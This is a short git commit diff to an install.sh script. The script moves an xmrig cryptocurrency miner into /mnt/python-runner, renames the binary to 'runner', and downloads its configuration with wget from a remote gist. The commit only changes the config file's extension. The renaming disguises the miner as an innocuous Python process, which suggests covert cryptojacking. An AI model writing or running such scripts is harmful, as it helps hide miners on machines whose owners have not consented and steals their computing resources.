9962da1f5900c420045d58965adceee49c447b21
eilya <eilya.armanfar@gmail.com>
2021-03-28 19:43:33 +0430

    Update install.sh

--- install.sh
+++ install.sh
@@ -7,4 +7,4 @@ mv /mnt/xmrig-6.10.0 /mnt/python-runner
 cd /mnt/python-runner
 rm -rf /mnt/python-runner/SHA256SUMS && rm -rf /mnt/python-runner/config.json
 mv /mnt/python-runner/xmrig /mnt/python-runner/runner
-wget -O /mnt/python-runner/config.json https://gist.githubusercontent.com/Eilya/08599d39124e02252dbec21534607de0/raw/bb47bd10a7af07c1da2d88c6e6f3e3dcf7e5670d/config.conf
+wget -O /mnt/python-runner/config.json https://gist.githubusercontent.com/Eilya/08599d39124e02252dbec21534607de0/raw/bb47bd10a7af07c1da2d88c6e6f3e3dcf7e5670d/config.json
